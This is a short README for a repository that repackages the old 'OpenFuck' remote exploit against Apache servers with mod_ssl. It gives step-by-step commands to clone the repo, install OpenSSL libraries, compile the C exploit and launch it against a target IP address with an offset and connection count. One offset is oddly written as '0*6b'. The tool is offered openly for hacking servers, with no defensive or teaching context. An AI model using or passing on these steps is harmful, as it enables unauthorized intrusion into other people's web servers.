# Open6uck
Original Name is OpenFuck, but i changed it for some reasons.

This is an exploit to hack the apache server

## Usage
This Exploit (https://www.exploit-db.com/exploits/764/) is outdated.

Below you can take updated exploit file
1. Download the below file
~~~
git clone https://github.com/Dpentester/Open6uck.git
~~~
2. Install libssl-dev (or) libssl1.0-dev
~~~
apt install libssl-dev
apt install libssl1.0-dev
~~~

3. Now Compile
~~~
gcc -o OpenFuck 764.c -lcrypto
~~~
4. Run the exploit
~~~
./OpenFuck
~~~
5. See which service you want to exploit. For example if you need to exploit Red Hat Linux, using apache version 1.3.20.
~~~
./OpenFuck 0*6b [IP Address] -c 50
~~~
